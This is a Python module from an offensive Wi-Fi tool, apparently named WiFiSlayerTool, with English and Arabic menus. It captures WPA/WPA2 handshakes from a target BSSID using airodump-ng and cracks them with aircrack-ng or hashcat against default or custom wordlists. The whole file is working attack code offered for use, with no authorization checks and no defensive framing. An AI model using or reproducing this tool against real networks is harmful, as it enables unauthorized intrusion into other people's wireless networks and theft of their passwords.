# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Handshake Module
Capture WPA/WPA2 handshakes and crack them with aircrack-ng or hashcat.
"""

import os
import subprocess
import glob
import shlex

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, print_sub_menu,
)
from core.validator import safe_input, validate_mac, validate_channel, validate_file_path
from core.network import get_wireless_interfaces
from core.ascii_art import print_handshake_art
from config import get_text, HANDSHAKE_DIR, DEFAULT_WORDLISTS


def handshake_menu(current_interface=None):
    """Handshake capture sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "🤝", "التقاط مصافحة جديدة (Capture Handshake)"),
                ("2", "📂", "عرض ملفات المصافحات المحفوظة"),
            ]
        else:
            options = [
                ("1", "🤝", "Capture New Handshake"),
                ("2", "📂", "List Saved Handshake Files"),
            ]

        title = "🤝 " + get_text("menu_handshake")
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            capture_handshake(current_interface)
        elif choice == "2":
            list_handshakes()
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def capture_handshake(interface=None):
    """Capture a WPA/WPA2 handshake using airodump-ng."""
    os.system("clear" if os.name != "nt" else "cls")
    print_handshake_art()
    print_section("Capture Handshake")

    if not interface:
        interfaces = get_wireless_interfaces()
        interface = select_interface(interfaces)
        if not interface:
            print_error("No interface selected")
            return

    mac = safe_input(get_text("enter_mac"), validate_mac, console)
    if not mac:
        return

    channel = safe_input(get_text("enter_channel"), validate_channel, console)
    if not channel:
        return

    output_name = safe_input(
        "Enter output file name / أدخل اسم ملف الحفظ",
        console=console,
    )
    if not output_name:
        output_name = "handshake"

    output_path = os.path.join(HANDSHAKE_DIR, output_name)

    log.info(f"Capturing handshake: BSSID={mac}, CH={channel}, "
             f"Interface={interface}, Output={output_path}")

    print_info(f"Capturing handshake for [bold]{mac}[/] on CH [bold]{channel}[/]")
    print_info("Press [bold]Ctrl+C[/] when handshake is captured")
    console.print()

    try:
        os.system(
            f"sudo airodump-ng {interface} -w {shlex.quote(output_path)} "
            f"-c {channel} --bssid {mac}"
        )
    except KeyboardInterrupt:
        console.print()

    # Check if file was created
    cap_file = f"{output_path}-01.cap"
    if os.path.exists(cap_file):
        print_info(get_text("validating_handshake"))
        result = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)
        output_lower = result.stdout.lower()
        
        if "1 handshake" in output_lower or "wpa (" in output_lower or "handshake" in output_lower:
            print_success(f"{get_text('handshake_valid')} → [bold]{cap_file}[/]")
        else:
            print_error(get_text("handshake_invalid"))
    else:
        print_warning("Handshake file not detected. It may still have been captured.")


def list_handshakes():
    """List all saved handshake .cap files."""
    print_section("Saved Handshakes")

    patterns = [
        os.path.join(HANDSHAKE_DIR, "*.cap"),
        os.path.join(HANDSHAKE_DIR, "*.pcap"),
    ]

    files = []
    for pattern in patterns:
        files.extend(glob.glob(pattern))

    if not files:
        print_warning(f"No handshake files found in {HANDSHAKE_DIR}")
        return

    from rich.table import Table

    table = Table(
        title="[bold bright_cyan]📂 Handshake Files[/]",
        border_style="cyan",
    )
    table.add_column("#", width=3, justify="center", style="bold yellow")
    table.add_column("File", style="bright_green")
    table.add_column("Size", justify="right", style="bright_white")

    for i, f in enumerate(files, 1):
        size = os.path.getsize(f)
        size_str = f"{size:,} bytes" if size < 1024 else f"{size / 1024:.1f} KB"
        table.add_row(str(i), os.path.basename(f), size_str)

    console.print(table)
    return files


# ═════════════════════════════════════════════════════════════
#  CRACK MODULE
# ═════════════════════════════════════════════════════════════
def crack_menu():
    """Password cracking sub-menu."""
    while True:
        console.print()
        if get_text("choose") == "اختر":
            options = [
                ("1", "🔑", "كسر بقوائم Kali الافتراضية"),
                ("2", "📄", "كسر بقائمة كلمات مخصصة"),
                ("3", "⚡", "كسر باستخدام Hashcat (GPU)"),
                ("4", "📂", "عرض ملفات المصافحات المحفوظة"),
            ]
        else:
            options = [
                ("1", "🔑", "Crack with Default Kali Wordlists"),
                ("2", "📄", "Crack with Custom Wordlist"),
                ("3", "⚡", "Crack with Hashcat (GPU)"),
                ("4", "📂", "List Saved Handshake Files"),
            ]

        title = "🔓 " + get_text("menu_crack")
        print_sub_menu(title, options)

        choice = console.input(f"\n  [bold bright_cyan]➤ {get_text('choose')}:[/] ").strip()

        if choice == "1":
            crack_with_defaults()
        elif choice == "2":
            crack_with_custom()
        elif choice == "3":
            crack_with_hashcat()
        elif choice == "4":
            list_handshakes()
        elif choice == "0":
            break
        else:
            print_error(get_text("invalid_choice"))


def _get_handshake_path():
    """Helper: ask user for the handshake file path."""
    # Show available files first
    files = list_handshakes()

    handshake_name = safe_input(
        get_text("enter_handshake"),
        console=console,
    )
    if not handshake_name:
        return None

    # Try to find the file
    possible_paths = [
        handshake_name,
        f"{handshake_name}.cap",
        os.path.join(HANDSHAKE_DIR, handshake_name),
        os.path.join(HANDSHAKE_DIR, f"{handshake_name}.cap"),
        os.path.join(HANDSHAKE_DIR, f"{handshake_name}-01.cap"),
    ]

    for path in possible_paths:
        expanded = os.path.expanduser(path)
        if os.path.isfile(expanded):
            return os.path.abspath(expanded)

    print_error(f"Handshake file not found: {handshake_name}")
    return None


def crack_with_defaults():
    """Crack handshake using default Kali Linux wordlists."""
    print_section("Crack — Default Wordlists")

    cap_path = _get_handshake_path()
    if not cap_path:
        return

    found_any = False
    for wordlist in DEFAULT_WORDLISTS:
        if os.path.exists(wordlist):
            found_any = True
            print_info(f"Trying: [bold]{os.path.basename(wordlist)}[/] ...")
            log.info(f"Cracking {cap_path} with {wordlist}")
            result = os.system(f"sudo aircrack-ng {shlex.quote(cap_path)} -w {shlex.quote(wordlist)}")
            if result == 0:
                print_success("Password found! Check output above.")
                return
        else:
            print_warning(f"Wordlist not found: {wordlist}")

    if not found_any:
        print_error("No default wordlists found on this system")


def crack_with_custom():
    """Crack handshake using a custom wordlist."""
    print_section("Crack — Custom Wordlist")

    cap_path = _get_handshake_path()
    if not cap_path:
        return

    wordlist = safe_input(get_text("enter_wordlist"), validate_file_path, console)
    if not wordlist:
        return

    log.info(f"Cracking {cap_path} with custom wordlist {wordlist}")
    print_info(f"Cracking with [bold]{os.path.basename(wordlist)}[/] ...")
    console.print()

    os.system(f"sudo aircrack-ng {shlex.quote(cap_path)} -w {shlex.quote(wordlist)}")


def crack_with_hashcat():
    """Crack handshake using hashcat (GPU acceleration)."""
    print_section("Crack — Hashcat (GPU)")

    cap_path = _get_handshake_path()
    if not cap_path:
        return

    # Convert .cap to .hccapx format for hashcat
    hccapx_path = cap_path.replace(".cap", ".hccapx")

    print_info("Converting .cap to .hccapx format ...")
    hccapx_base = hccapx_path.replace('.hccapx', '')
    convert_result = os.system(
        f"sudo cap2hccapx {shlex.quote(cap_path)} {shlex.quote(hccapx_path)} 2>/dev/null || "
        f"sudo aircrack-ng {shlex.quote(cap_path)} -J {shlex.quote(hccapx_base)} 2>/dev/null"
    )

    wordlist = safe_input(get_text("enter_wordlist"), validate_file_path, console)
    if not wordlist:
        return

    log.info(f"Hashcat cracking: {hccapx_path} with {wordlist}")
    print_info("Starting hashcat ...")
    console.print()

    # WPA/WPA2 mode = 22000 (modern) or 2500 (legacy)
    os.system(f"sudo hashcat -m 22000 {shlex.quote(hccapx_path)} {shlex.quote(wordlist)} --force")
